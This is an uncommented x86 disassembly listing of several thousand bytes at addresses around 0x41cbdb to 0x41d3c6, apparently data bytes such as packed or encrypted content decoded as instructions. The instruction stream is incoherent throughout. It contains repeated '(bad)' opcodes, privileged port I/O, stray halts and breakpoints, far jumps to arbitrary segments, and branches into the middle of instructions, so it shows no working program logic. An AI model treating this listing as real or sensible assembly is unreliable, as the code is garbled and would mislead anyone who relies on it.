  41cbdb:	lahf   
  41cbdc:	mov    bh,0xcd
  41cbde:	icebp  
  41cbdf:	in     eax,dx
  41cbe0:	sbb    ecx,DWORD PTR [ebp-0x29d800d3]
  41cbe6:	push   ebx
  41cbe7:	lock push ecx
  41cbe9:	mov    edi,0xba2549ea
  41cbee:	mov    BYTE PTR [edi-0x768683c1],ch
  41cbf4:	push   esp
  41cbf5:	inc    edx
  41cbf6:	mov    ebp,0x1a86f32d
  41cbfb:	pop    esp
  41cbfc:	mov    edi,0xbab50dc4
  41cc01:	cld    
  41cc02:	gs iret 
  41cc04:	xchg   ebx,eax
  41cc05:	pusha  
  41cc06:	jae    0x41cc28
  41cc08:	xor    esi,DWORD PTR ds:0xe75f1668
  41cc0e:	aas    
  41cc0f:	or     DWORD PTR [ebx+0x3c912b93],esp
  41cc15:	dec    edx
  41cc16:	mov    esp,0x7c323cdf
  41cc1b:	sar    DWORD PTR [ebp-0x6dd6b59b],0x0
  41cc22:	jge    0x41cbf6
  41cc24:	or     BYTE PTR [edx],ch
  41cc26:	das    
  41cc27:	xchg   esp,eax
  41cc28:	lods   al,BYTE PTR ds:[esi]
  41cc29:	push   0x6262cf49
  41cc2e:	je     0x41cc47
  41cc30:	add    DWORD PTR [edx-0x71c8af86],ebx
  41cc36:	test   BYTE PTR [ebp+0x5f3a37f1],0x57
  41cc3d:	clc    
  41cc3e:	cli    
  41cc3f:	jno    0x41cbf9
  41cc41:	aas    
  41cc42:	mov    al,ds:0x3cfb367c
  41cc47:	lea    edi,[esi+0x3]
  41cc4a:	out    0xa5,eax
  41cc4c:	sbb    BYTE PTR [eax+0x2a],0x32
  41cc50:	push   cs
  41cc51:	xchg   ecx,eax
  41cc52:	push   ecx
  41cc53:	mov    esp,0xe831882e
  41cc58:	dec    edx
  41cc59:	ret    
  41cc5a:	xor    eax,0x6bc9ae25
  41cc5f:	je     0x41cca6
  41cc61:	out    dx,eax
  41cc62:	dec    ecx
  41cc63:	pop    esp
  41cc64:	sub    edi,esp
  41cc66:	push   ebp
  41cc67:	xchg   esi,eax
  41cc68:	in     eax,dx
  41cc69:	push   ecx
  41cc6a:	xchg   ebx,eax
  41cc6b:	pop    ebp
  41cc6c:	jno    0x41cc15
  41cc6e:	shl    BYTE PTR ds:0xf2925452,0xa4
  41cc75:	and    eax,0xfffffff9
  41cc78:	inc    ecx
  41cc79:	in     al,dx
  41cc7a:	mov    DWORD PTR [ebp+0x9683729],edi
  41cc80:	ins    DWORD PTR es:[edi],dx
  41cc81:	jmp    0x41ccf6
  41cc83:	adc    dl,BYTE PTR [ebp-0x37]
  41cc86:	jb     0x41cc3b
  41cc88:	xor    eax,DWORD PTR [ecx+0x64aeffba]
  41cc8e:	in     al,0xe5
  41cc90:	xchg   esp,eax
  41cc91:	hlt    
  41cc92:	push   ss
  41cc93:	imul   ebp,esp,0xe
  41cc96:	stos   BYTE PTR es:[edi],al
	...
  41cd13:	add    al,ch
  41cd15:	shl    BYTE PTR [edi+0x76],1
  41cd18:	jg     0x41cd11
  41cd1a:	stc    
  41cd1b:	ficom  WORD PTR [ebp+0x2e]
  41cd1e:	inc    esp
  41cd1f:	and    al,0xa3
  41cd21:	or     eax,0x69cafce6
  41cd26:	add    DWORD PTR [eax],eax
  41cd28:	imul   eax,DWORD PTR [edi],0x0
  41cd2b:	add    BYTE PTR [ecx-0x1],bl
  41cd2e:	push   ss
  41cd2f:	and    ebp,ebx
  41cd31:	(bad)
  41cd34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd35:	sub    edx,DWORD PTR ds:[ebp-0xb]
  41cd39:	pop    es
  41cd3a:	sub    al,0x6f
  41cd3c:	xchg   esp,eax
  41cd3d:	xchg   edx,eax
  41cd3e:	out    dx,al
  41cd3f:	je     0x41cd47
  41cd41:	sahf   
  41cd42:	push   eax
  41cd43:	aad    0x39
  41cd45:	test   al,0x77
  41cd47:	add    bl,BYTE PTR [ebp+0x639ab446]
  41cd4d:	pop    ds
  41cd4e:	ret    
  41cd4f:	in     al,0x25
  41cd51:	sahf   
  41cd52:	addr16 (bad) 
  41cd54:	gs test al,0xb0
  41cd57:	inc    ebp
  41cd58:	nop
  41cd59:	sub    eax,0x3dbc3eec
  41cd5e:	cmp    al,0x6d
  41cd60:	mov    eax,0x9ebfc86a
  41cd66:	pusha  
  41cd67:	repnz in al,dx
  41cd69:	jo     0x41cd85
  41cd6b:	jp     0x41cd50
  41cd6d:	push   eax
  41cd6e:	ins    DWORD PTR es:[edi],dx
  41cd6f:	xchg   DWORD PTR [ebp+ebp*8+0x1aae1506],ebx
  41cd76:	mov    ch,0x3f
  41cd78:	fst    QWORD PTR [ecx+0x23]
  41cd7b:	dec    esi
  41cd7c:	dec    ebx
  41cd7d:	neg    DWORD PTR [edx-0x77724b7d]
  41cd83:	repnz xchg esp,eax
  41cd85:	or     ebp,DWORD PTR [esi-0x1eaf1bbb]
  41cd8b:	cs mov edi,0x71f8f494
  41cd91:	test   al,0x9a
  41cd93:	dec    ecx
  41cd94:	pushf  
  41cd95:	and    al,BYTE PTR ds:0x880d6986
  41cd9b:	jmp    0x41cd5c
  41cd9d:	inc    ebx
  41cd9e:	sub    al,0xe2
  41cda0:	mov    edi,0xbaa208ce
  41cda5:	push   edi
  41cda6:	mov    ah,0x92
  41cda8:	jle    0x41ce28
  41cdaa:	imul   edx,DWORD PTR [ebx+0x8d2cb25],0x1e
  41cdb1:	inc    ecx
  41cdb2:	sub    esp,esp
  41cdb4:	aas    
  41cdb5:	stc    
  41cdb6:	jne    0x41cd4f
  41cdb8:	xor    al,0x3
  41cdba:	out    dx,al
  41cdbb:	jle    0x41cd46
  41cdbd:	addr16 jo 0x41cdf5
  41cdc0:	(bad)  
  41cdc1:	popa   
  41cdc2:	in     al,0xb6
  41cdc4:	mov    cl,0x75
  41cdc6:	sub    ebx,DWORD PTR [ebx]
  41cdc8:	push   esi
  41cdc9:	push   edx
  41cdca:	imul   esi,DWORD PTR [edx],0x1e
  41cdcd:	cmp    edi,edx
  41cdcf:	(bad)  
  41cdd0:	loope  0x41ce19
  41cdd2:	loopne 0x41ce37
  41cdd4:	mov    WORD PTR [edx-0x4408ae36],ds
  41cdda:	dec    edx
  41cddb:	pop    DWORD PTR [edi-0x2c5b3479]
  41cde1:	rol    DWORD PTR gs:[eax+0xb8cd590],0xbc
  41cde9:	idiv   dl
  41cdeb:	mov    ebx,ds
  41cded:	sub    edx,eax
  41cdef:	fiadd  WORD PTR [edi-0xed3b3c4]
  41cdf5:	arpl   WORD PTR [ebx-0x57b48065],bx
  41cdfb:	lods   al,BYTE PTR ds:[esi]
  41cdfc:	scas   eax,DWORD PTR es:[edi]
  41cdfd:	sub    ah,BYTE PTR [ebx-0x10]
  41ce00:	or     cl,dh
  41ce02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce03:	or     bl,BYTE PTR [eax+0xf]
  41ce06:	fwait
  41ce07:	push   0xffffffe8
  41ce09:	shl    BYTE PTR [ebx-0x3c],cl
  41ce0c:	call   0x3497:0xca1c027c
  41ce13:	mov    ebx,0xc60f4f86
  41ce18:	adc    ecx,edx
  41ce1a:	jp     0x41cdc3
  41ce1c:	sub    ah,BYTE PTR [eax-0x5f]
  41ce1f:	(bad)  
  41ce20:	(bad)  [edx-0x6fd54181]
  41ce26:	mov    ebx,0x4a634029
  41ce2b:	mov    DWORD PTR [eax+ebx*2],ecx
  41ce2e:	xor    eax,0x636e22a6
  41ce33:	in     eax,0xc8
  41ce35:	mov    ah,0x74
  41ce37:	jb     0x41ce43
  41ce39:	in     al,dx
  41ce3a:	inc    edx
  41ce3b:	dec    esi
  41ce3c:	shl    ebx,1
  41ce3e:	loope  0x41ceac
  41ce40:	mov    bl,0xd4
  41ce42:	int    0x64
  41ce44:	xor    BYTE PTR [esi+edx*8-0x1],dh
  41ce48:	cmc    
  41ce49:	cmp    BYTE PTR [edi],bh
  41ce4b:	xchg   ebp,eax
  41ce4c:	data16 mov al,bl
  41ce4f:	sti    
  41ce50:	test   al,0x68
  41ce52:	add    BYTE PTR [ebp+0x4f],ah
  41ce55:	and    eax,0xfdd0166e
  41ce5a:	add    BYTE PTR [eax+0x11],0x6c
  41ce5e:	dec    edi
  41ce5f:	loopne 0x41ceba
  41ce61:	xor    BYTE PTR [edi-0x74],dl
  41ce64:	fcmovnbe st,st(2)
  41ce66:	jbe    0x41ce87
  41ce68:	fbstp  TBYTE PTR [eax-0x7ddf794c]
  41ce6e:	les    edx,FWORD PTR [edx]
  41ce70:	dec    ebx
  41ce71:	sub    ebp,DWORD PTR [ecx]
  41ce73:	pop    eax
  41ce74:	(bad)  
  41ce75:	(bad)  
  41ce76:	inc    edx
  41ce77:	adc    ch,BYTE PTR [ebp-0x3cbb0b66]
  41ce7d:	cmp    ecx,edi
  41ce7f:	lods   eax,DWORD PTR ds:[esi]
  41ce80:	mov    bl,0xb4
  41ce82:	mov    esi,DWORD PTR [ecx]
  41ce84:	and    esp,DWORD PTR [edx+0x4]
  41ce87:	and    eax,DWORD PTR [esi]
  41ce89:	and    bl,dl
  41ce8b:	or     ah,ah
  41ce8d:	jecxz  0x41cee2
  41ce8f:	push   cs
  41ce90:	mov    ebp,0xc7d8d81e
  41ce95:	ds mov edx,0x55b23f27
  41ce9b:	xchg   esp,eax
  41ce9c:	call   0x37d3:0x88fa060b
  41cea3:	cwde   
  41cea4:	stc    
  41cea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cea6:	fcmovnu st,st(6)
  41cea8:	sahf   
  41cea9:	xchg   DWORD PTR [ebp+0x769ea0e4],ebp
  41ceaf:	pop    esp
  41ceb0:	cmc    
  41ceb1:	sbb    BYTE PTR ds:0x8266dffb,al
  41ceb7:	fld    st(1)
  41ceb9:	xchg   ebx,eax
  41ceba:	outs   dx,BYTE PTR ds:[esi]
  41cebb:	lea    esp,[esi-0xb09e85f]
  41cec1:	pop    ecx
  41cec2:	in     al,0xdf
  41cec4:	leave  
  41cec5:	push   ds
  41cec6:	iret   
  41cec7:	ret    
  41cec8:	or     DWORD PTR ds:0xbb762e38,esp
  41cece:	fcomp  DWORD PTR [ecx-0x747a2e30]
  41ced4:	and    esp,DWORD PTR [esi+ebx*2]
  41ced7:	jae    0x41cebb
  41ced9:	add    ebx,DWORD PTR [ecx-0x22]
  41cedc:	xchg   ebx,eax
  41cedd:	jmp    0x41cea0
  41cedf:	xor    al,0x50
  41cee1:	mov    ebp,0x57115f15
  41cee6:	jecxz  0x41ce74
  41cee8:	xor    edi,DWORD PTR ds:0x35c0c92b
  41ceee:	ror    DWORD PTR [ebp+ecx*1+0x1d67a477],1
  41cef5:	leave  
  41cef6:	mov    ch,BYTE PTR [edi+0x45b04759]
  41cefc:	sub    ah,bh
  41cefe:	lahf   
  41ceff:	int3   
  41cf00:	fcom   DWORD PTR [esp+edi*8+0x36]
  41cf04:	dec    esi
  41cf05:	imul   esp,DWORD PTR [ebx-0x171d08b2],0xa70540bc
  41cf0f:	jae    0x41cefc
  41cf11:	xchg   ecx,eax
  41cf12:	cwde   
  41cf13:	mov    ebx,0xb46fb241
  41cf18:	mov    esp,0x98965df8
  41cf1d:	jmp    0x239cf8cf
  41cf22:	cmp    bl,BYTE PTR [ecx]
  41cf24:	cmp    ebx,DWORD PTR [esi]
  41cf26:	push   0x8736eb88
  41cf2b:	fs icebp 
  41cf2d:	inc    al
  41cf2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf30:	mov    edx,0xef7ca5d7
  41cf35:	xchg   BYTE PTR [eax+0x2c],dh
  41cf38:	sub    BYTE PTR [ebp-0x3d45a075],0xa2
  41cf3f:	out    dx,al
  41cf40:	js     0x41cf13
  41cf42:	(bad)  
  41cf43:	retf   
  41cf44:	outs   dx,BYTE PTR ds:[esi]
  41cf45:	adc    al,0xba
  41cf47:	int    0xe8
  41cf49:	hlt    
  41cf4a:	adc    ah,bl
  41cf4c:	and    ebx,DWORD PTR [eax+edi*1]
  41cf4f:	sub    DWORD PTR [ebp-0x3],ebp
  41cf52:	loopne 0x41cf4d
  41cf54:	jmp    0x41cf06
  41cf56:	sbb    edi,DWORD PTR [ebx+0x6d]
  41cf59:	dec    ecx
  41cf5a:	inc    ecx
  41cf5b:	ret    0x6e56
  41cf5e:	push   ebx
  41cf5f:	data16 (bad) 
  41cf61:	lock retf 0x4c61
  41cf65:	pop    esi
  41cf66:	mov    ds:0x65f3e5a6,eax
  41cf6b:	stc    
  41cf6c:	int3   
  41cf6d:	iret   
  41cf6e:	test   eax,0xe1d850f8
  41cf73:	sbb    dl,BYTE PTR [esi]
  41cf75:	xchg   edx,eax
  41cf76:	mov    eax,0x50532b48
  41cf7b:	nop
  41cf7c:	inc    esi
  41cf7d:	cli    
  41cf7e:	push   cs
  41cf7f:	mov    edx,0x5dbb7d6e
  41cf84:	sahf   
  41cf85:	pusha  
  41cf86:	out    dx,al
  41cf87:	jp     0x41cf1e
  41cf89:	jae    0x41cffb
  41cf8b:	es push ebx
  41cf8d:	pop    ebx
  41cf8e:	inc    ebp
  41cf8f:	test   BYTE PTR [ecx],dl
  41cf91:	cdq    
  41cf92:	or     ch,ch
  41cf94:	cmp    bl,BYTE PTR ds:0x11f62596
  41cf9a:	xor    al,0x9c
  41cf9c:	fcmovne st,st(4)
  41cf9e:	jle    0x41cf75
  41cfa0:	mov    WORD PTR [edi-0x4b362d3e],cs
  41cfa6:	jp     0x41cfa2
  41cfa8:	mov    eax,0x45521396
  41cfad:	pop    ebx
  41cfae:	push   ds
  41cfaf:	pushf  
  41cfb0:	xor    eax,0x56c66841
  41cfb5:	sbb    eax,0xffffff90
  41cfb8:	jge    0x41cf73
  41cfba:	clc    
  41cfbb:	xchg   edx,eax
  41cfbc:	mov    dh,0x74
  41cfbe:	call   0x479d61aa
  41cfc3:	xchg   esi,eax
  41cfc4:	stc    
  41cfc5:	fldlg2 
  41cfc7:	or     esp,DWORD PTR [esi+ecx*1-0x33]
  41cfcb:	(bad)  
  41cfcc:	in     eax,dx
  41cfcd:	es jno 0x41cf9d
  41cfd0:	inc    eax
  41cfd1:	mov    eax,0x51dc5f5d
  41cfd6:	ret    
  41cfd7:	pop    edx
  41cfd8:	pop    es
  41cfd9:	jns    0x41cf91
  41cfdb:	loop   0x41cf67
  41cfdd:	rcl    BYTE PTR [eax+0x5dd036ed],1
  41cfe3:	and    al,0x3
  41cfe5:	ins    BYTE PTR es:[edi],dx
  41cfe6:	int3   
  41cfe7:	mov    ecx,DWORD PTR [edi]
  41cfe9:	ja     0x41cffc
  41cfeb:	test   DWORD PTR [edi-0x3],esp
  41cfee:	mov    al,0xba
  41cff0:	cmp    dh,BYTE PTR [ecx]
  41cff2:	test   DWORD PTR [ebx],edx
  41cff4:	pop    ecx
  41cff5:	popf   
  41cff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cff7:	nop
  41cff8:	test   eax,0x9915c874
  41cffd:	and    dl,bl
  41cfff:	imul   DWORD PTR [ecx]
  41d001:	test   DWORD PTR [eax-0x57],0x4721ffd7
  41d008:	and    al,0xe9
  41d00a:	jmp    0xf5f0:0x79c73862
  41d011:	push   ecx
  41d012:	aam    0x66
  41d014:	pop    ebx
  41d015:	mul    DWORD PTR [esi]
  41d017:	and    BYTE PTR [ebx*2+0x6305771f],dh
  41d01e:	lods   al,BYTE PTR ds:[esi]
  41d01f:	jns    0x41d058
  41d021:	sbb    dh,ah
  41d023:	and    DWORD PTR [edx+0x65fbaebf],edi
  41d029:	lods   al,BYTE PTR ds:[esi]
  41d02a:	cli    
  41d02b:	hlt    
  41d02c:	fldenv [edx+0x187de010]
  41d032:	pop    esp
  41d033:	(bad)  
  41d034:	jp     0x41d073
  41d036:	xchg   DWORD PTR [ecx-0x5],eax
  41d039:	jo     0x41d063
  41d03b:	mov    esi,0x151e0037
  41d040:	imul   BYTE PTR [esi-0x608a80c4]
  41d046:	scas   al,BYTE PTR es:[edi]
  41d047:	fs sbb ah,ch
  41d04a:	int3   
  41d04b:	pop    esi
  41d04c:	sahf   
  41d04d:	cmp    eax,0x3d428ae4
  41d052:	jmp    0x41d097
  41d054:	ins    BYTE PTR es:[edi],dx
  41d055:	inc    ebx
  41d056:	pop    ds
  41d057:	push   esi
  41d058:	xchg   edx,eax
  41d059:	and    ecx,eax
  41d05b:	scas   al,BYTE PTR es:[edi]
  41d05c:	mov    al,0xed
  41d05e:	fnstcw WORD PTR [esi-0x2a2a5250]
  41d064:	pop    edi
  41d065:	data16 aas 
  41d067:	cdq    
  41d068:	in     eax,dx
  41d069:	mov    bl,0xf7
  41d06b:	mov    ebx,ebx
  41d06d:	jg     0x41d051
  41d06f:	xchg   edi,eax
  41d070:	cmp    al,0x38
  41d072:	out    0x2,al
  41d074:	fdivr  DWORD PTR [esi+0x4d]
  41d077:	xor    BYTE PTR [ebx],ch
  41d079:	inc    edx
  41d07a:	out    0xdf,al
  41d07c:	and    DWORD PTR [edx],ecx
  41d07e:	push   cs
  41d07f:	pop    edx
  41d080:	repnz in eax,dx
  41d082:	sar    BYTE PTR [edx+0x32],1
  41d085:	adc    DWORD PTR [edx],ecx
  41d087:	inc    eax
  41d088:	das    
  41d089:	pop    edi
  41d08a:	repz mov ebx,0xdd527510
  41d090:	mov    edi,0x8f8bc725
  41d095:	mov    al,BYTE PTR [edi-0xe]
  41d098:	pop    ss
  41d099:	mov    ebp,0x48b92521
  41d09e:	xor    edi,ebx
  41d0a0:	ds mov ecx,0xf2bc36d9
  41d0a6:	jns    0x41d0fa
  41d0a8:	jl     0x41d105
  41d0aa:	loopne 0x41d0b5
  41d0ac:	retf   
  41d0ad:	sbb    eax,0xf396500b
  41d0b2:	add    al,BYTE PTR ds:0xdb9bf65b
  41d0b8:	pop    esi
  41d0b9:	jno    0x41d084
  41d0bb:	(bad)  
  41d0bc:	cmc    
  41d0bd:	lea    eax,[ecx-0x43]
  41d0c0:	daa    
  41d0c1:	jmp    DWORD PTR [ebx-0x79]
  41d0c4:	add    BYTE PTR gs:[eax],dl
  41d0c7:	add    eax,0xbc726985
  41d0cc:	rol    al,1
  41d0ce:	data16 jl 0x41d124
  41d0d1:	inc    eax
  41d0d2:	out    dx,eax
  41d0d3:	std    
  41d0d4:	pop    edx
  41d0d5:	push   ds
  41d0d6:	pop    ds
  41d0d7:	(bad)  [ebx+0x42d488f1]
  41d0dd:	js     0x41d0bb
  41d0df:	retf   
  41d0e0:	pusha  
  41d0e1:	mov    al,ds:0xe98944ab
  41d0e6:	sbb    dl,BYTE PTR ds:0xebeaf657
  41d0ec:	pop    ebp
  41d0ed:	push   esi
  41d0ee:	fs scas al,BYTE PTR es:[edi]
  41d0f0:	mov    esi,0x41a66949
  41d0f5:	stos   BYTE PTR es:[edi],al
  41d0f6:	push   cs
  41d0f7:	call   0xd162caa6
  41d0fc:	adc    al,0x79
  41d0fe:	jne    0x41d15c
  41d100:	retf   0x234c
  41d103:	jno    0x41d0ba
  41d105:	cmp    DWORD PTR [esi-0x426efa77],0xffffffa5
  41d10c:	sbb    al,BYTE PTR [esi+0x5dbfe208]
  41d112:	fwait
  41d113:	sbb    eax,0xbff5f9c
  41d118:	test   al,0xf6
  41d11a:	mov    ds,WORD PTR [eax]
  41d11c:	ret    0x12d1
  41d11f:	push   ss
  41d120:	psubb  mm5,QWORD PTR [ecx+esi*1-0x62fed248]
  41d128:	jg     0x41d123
  41d12a:	pop    edx
  41d12b:	push   edi
  41d12c:	sub    ebp,DWORD PTR [eax+0x4d]
  41d12f:	idiv   DWORD PTR [edx+eax*1]
  41d132:	mov    dh,0x83
  41d134:	add    DWORD PTR [esi],ebp
  41d136:	stc    
  41d137:	(bad)  
  41d138:	sti    
  41d139:	enter  0xdaf4,0xba
  41d13d:	mov    eax,ds:0xe504e2cb
  41d142:	jle    0x41d161
  41d144:	xor    bh,dl
  41d146:	and    DWORD PTR [esi],edi
  41d148:	pop    edi
  41d149:	mov    ds:0xb81ed7dc,eax
  41d14e:	cld    
  41d14f:	jecxz  0x41d1b1
  41d151:	add    eax,0xf56532b4
  41d156:	loopne 0x41d16d
  41d158:	xor    al,0x75
  41d15a:	out    0x92,al
  41d15c:	add    al,0x8
  41d15e:	mov    WORD PTR [edi+0x35],ds
  41d161:	mov    ds:0x760e2450,al
  41d166:	(bad)  
  41d167:	jg     0x41d15c
  41d169:	rol    DWORD PTR [ebx+0x3b],cl
  41d16c:	sbb    BYTE PTR [edx-0x7f],bl
  41d16f:	and    eax,0x3273c012
  41d174:	and    ecx,DWORD PTR [esi-0x7]
  41d177:	sbb    BYTE PTR [edi+0x57],dh
  41d17a:	sar    dl,1
  41d17c:	mov    edx,0xbb255de9
  41d181:	pop    es
  41d182:	inc    edx
  41d183:	xlat   BYTE PTR ds:[ebx]
  41d184:	xchg   bl,dh
  41d186:	fcom   DWORD PTR [esp+edx*1]
  41d189:	mov    bh,0xff
  41d18b:	sbb    ah,0x84
  41d18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d18f:	iret   
  41d190:	mov    ch,0x5e
  41d192:	xchg   ebp,eax
  41d193:	fld    TBYTE PTR [esi+0x2c386a0e]
  41d199:	inc    ebx
  41d19a:	jnp    0x41d198
  41d19c:	push   edx
  41d19d:	adc    dh,BYTE PTR ds:[edx]
  41d1a0:	adc    cl,al
  41d1a2:	pop    ss
  41d1a3:	jecxz  0x41d1e1
  41d1a5:	jno    0x41d1a1
  41d1a7:	adc    ch,BYTE PTR [edi-0xd243602]
  41d1ad:	pop    edx
  41d1ae:	or     eax,0x37fa9381
  41d1b3:	aad    0x64
  41d1b5:	mov    edx,0x7c1e00c3
  41d1ba:	rcl    esi,cl
  41d1bc:	or     BYTE PTR [edi],al
  41d1be:	retf   0x4909
  41d1c1:	and    eax,DWORD PTR [eax+0x1cda7414]
  41d1c7:	inc    ebp
  41d1c8:	push   ds
  41d1c9:	jl     0x41d236
  41d1cb:	or     al,0xa5
  41d1cd:	cli    
  41d1ce:	retf   
  41d1cf:	dec    ebx
  41d1d0:	jl     0x41d1c1
  41d1d2:	jb     0x41d22a
  41d1d4:	mov    dl,0x72
  41d1d6:	push   ecx
  41d1d7:	jae    0x41d169
  41d1d9:	and    DWORD PTR [ebp+0x6d],0xffffff93
  41d1dd:	out    0x92,al
  41d1df:	sbb    edi,DWORD PTR [eax]
  41d1e1:	lock mov eax,0x8813dfaf
  41d1e7:	(bad)  
  41d1e8:	jecxz  0x41d186
  41d1ea:	leave  
  41d1eb:	ins    DWORD PTR es:[edi],dx
  41d1ec:	mov    al,ds:0xf14fe1a
  41d1f1:	aam    0x61
  41d1f3:	push   edi
  41d1f4:	jbe    0x41d25e
  41d1f6:	sub    edx,esi
  41d1f8:	or     eax,0xf120f525
  41d1fd:	pop    ecx
  41d1fe:	mov    BYTE PTR ds:0xa9e2b16e,dl
  41d204:	fidivr WORD PTR [ebx-0x6f6a3ae8]
  41d20a:	test   al,0x40
  41d20c:	imul   ebp,DWORD PTR [ebx],0xfffffff6
  41d20f:	adc    BYTE PTR [edi],ch
  41d211:	ins    DWORD PTR es:[edi],dx
  41d212:	fdivp  st(6),st
  41d214:	int3   
  41d215:	gs loopne 0x41d1ef
  41d218:	or     al,0xd5
  41d21a:	mov    al,ds:0xc0ddf2ba
  41d21f:	xchg   ebx,eax
  41d220:	fist   WORD PTR [esi-0x59]
  41d223:	dec    esi
  41d224:	cwde   
  41d225:	sbb    eax,DWORD PTR [edi+0x71]
  41d228:	call   0xf6d5:0xbcdf8647
  41d22f:	inc    ebp
  41d230:	mov    ecx,0x795ec7a8
  41d235:	ret    0x4133
  41d238:	jb     0x41d272
  41d23a:	int3   
  41d23b:	aad    0xf7
  41d23d:	mov    edx,0xea61b866
  41d242:	xchg   edi,eax
  41d243:	ret    0x7512
  41d246:	jmp    0x41d231
  41d248:	or     al,0x53
  41d24a:	pop    esp
  41d24b:	mov    ebx,0xbc8d96
  41d250:	adc    edx,DWORD PTR [edx+0x1582489b]
  41d256:	clc    
  41d257:	(bad)  
  41d258:	mov    BYTE PTR [edx+edx*4-0x31],cl
  41d25c:	retf   
  41d25d:	jns    0x41d207
  41d25f:	es jbe 0x41d202
  41d262:	pop    edi
  41d263:	call   0x21477f66
  41d268:	retf   0xe323
  41d26b:	fsubr  st(4),st
  41d26d:	and    eax,0xaa1db685
  41d272:	addr16 es icebp 
  41d275:	mov    eax,ds:0xcde70b28
  41d27a:	sbb    edx,DWORD PTR [edx-0xf]
  41d27d:	add    eax,0xdf45b0de
  41d282:	sub    BYTE PTR [ecx+eiz*1+0x35],dl
  41d286:	push   cs
  41d287:	test   al,0xb8
  41d289:	call   0xa6fec3aa
  41d28e:	js     0x41d299
  41d290:	(bad)  
  41d291:	aad    0xa3
  41d293:	fst    QWORD PTR [ebx]
  41d295:	push   eax
  41d296:	sub    DWORD PTR [ebx+0x2b],esp
  41d299:	sbb    BYTE PTR [esi+eiz*8-0x51],dl
  41d29d:	les    eax,FWORD PTR [esi+0x46]
  41d2a0:	sbb    al,0x34
  41d2a2:	inc    esi
  41d2a3:	sub    eax,DWORD PTR [ebx]
  41d2a5:	scas   eax,DWORD PTR es:[edi]
  41d2a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2a7:	jo     0x41d233
  41d2a9:	cmp    ebx,edi
  41d2ab:	sbb    BYTE PTR [eax+ebp*4-0x77],dh
  41d2af:	xchg   esi,eax
  41d2b0:	adc    eax,0x991bdac5
  41d2b5:	sub    eax,0x8855f6ac
  41d2ba:	mov    BYTE PTR es:[edx+0x61],dh
  41d2be:	mov    dh,0xaa
  41d2c0:	add    ch,BYTE PTR [ecx+0x67d889dc]
  41d2c6:	sahf   
  41d2c7:	cmp    dh,BYTE PTR [edx-0x3031d06a]
  41d2cd:	and    BYTE PTR [edx-0x80],bh
  41d2d0:	(bad)  
  41d2d1:	xor    BYTE PTR [esi+0x5a],0xdd
  41d2d5:	sbb    eax,0x7654e204
  41d2da:	fldenv [esp+ebx*1+0x74]
  41d2de:	ror    DWORD PTR [edx],1
  41d2e0:	adc    dh,BYTE PTR [edi-0x784f8e48]
  41d2e6:	xchg   ebp,esp
  41d2e8:	inc    ebx
  41d2e9:	mov    DWORD PTR [ebx],edi
  41d2eb:	out    0xda,eax
  41d2ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2ee:	data16 daa 
  41d2f0:	mov    dl,0x17
  41d2f2:	in     al,0x5
  41d2f4:	mov    bh,cl
  41d2f6:	xlat   BYTE PTR ds:[ebx]
  41d2f7:	push   es
  41d2f8:	shufps xmm1,xmm7,0x66
  41d2fc:	push   ebp
  41d2fd:	jo     0x41d2a7
  41d2ff:	push   DWORD PTR [edi+esi*1]
  41d302:	addr16 jae 0x41d2d0
  41d305:	imul   ebx,DWORD PTR [ecx],0xffffffe3
  41d308:	in     al,dx
  41d309:	mov    edi,0xb8e4161a
  41d30e:	cmovg  ebx,eax
  41d311:	std    
  41d312:	int    0x79
  41d314:	jg     0x41d362
  41d316:	in     al,dx
  41d317:	xor    eax,0xaf1206fb
  41d31c:	xchg   edi,eax
  41d31d:	iretw  
  41d31f:	fwait
  41d320:	xor    al,BYTE PTR [edx-0x2af7fd9e]
  41d326:	sub    DWORD PTR [ebp-0x8adb72d],eax
  41d32c:	xchg   BYTE PTR [edi+0x6f258467],bh
  41d332:	jno    0x41d2f0
  41d334:	test   al,0x57
  41d336:	and    BYTE PTR [eax+esi*8+0x6cd86b6c],0xf8
  41d33e:	icebp  
  41d33f:	gs cld 
  41d341:	jg     0x41d302
  41d343:	addr16 sahf 
  41d345:	and    DWORD PTR [ebp+ebp*1+0x42],ebp
  41d349:	ss mov cl,0x28
  41d34c:	sbb    bl,bh
  41d34e:	or     BYTE PTR [ebx],al
  41d350:	inc    edi
  41d351:	adc    bh,BYTE PTR [edx-0x65]
  41d354:	repnz push edi
  41d356:	cli    
  41d357:	(bad)  
  41d358:	icebp  
  41d359:	xor    al,0x63
  41d35b:	cmp    DWORD PTR [edi],ecx
  41d35d:	fiadd  WORD PTR [esi+0x6810169a]
  41d363:	push   0x5b
  41d365:	xor    al,dh
  41d367:	mov    ds:0x71077c3b,eax
  41d36c:	int    0x12
  41d36e:	inc    esp
  41d36f:	jae    0x41d312
  41d371:	push   es
  41d372:	add    ch,BYTE PTR [ebx+0x6ce1bc7]
  41d378:	sbb    BYTE PTR [ecx],ah
  41d37a:	mov    bl,0x63
  41d37c:	push   ecx
  41d37d:	xor    BYTE PTR [eax],0xf6
  41d380:	mov    ss,WORD PTR [esi]
  41d382:	clc    
  41d383:	mov    ebx,0x920a7c91
  41d388:	cmp    bh,BYTE PTR [ebp-0x48]
  41d38b:	sub    esi,DWORD PTR cs:[ebp-0x5843d859]
  41d392:	out    0xbb,eax
  41d394:	jge    0x41d320
  41d396:	loop   0x41d416
  41d398:	retf   0x9d84
  41d39b:	ja     0x41d3eb
  41d39d:	sub    DWORD PTR [ebp+ecx*4+0x10],ebx
  41d3a1:	out    dx,eax
  41d3a2:	cmp    ebp,DWORD PTR [esi+eiz*8+0xd]
  41d3a6:	imul   esi,DWORD PTR [ecx+0x1a],0x71
  41d3aa:	outs   dx,DWORD PTR ds:[esi]
  41d3ab:	jl     0x41d386
  41d3ad:	ror    BYTE PTR [esi+esi*1],cl
  41d3b0:	cmp    ch,BYTE PTR [ecx]
  41d3b2:	inc    esp
  41d3b3:	aaa    
  41d3b4:	mov    ds:0xa1eda541,al
  41d3b9:	mov    ds:0x4091e03f,al
  41d3be:	std    
  41d3bf:	rol    BYTE PTR [ecx-0x761a86d9],0x4b
  41d3c6:	cmp    BYTE PTR [eax+edx*8],bh
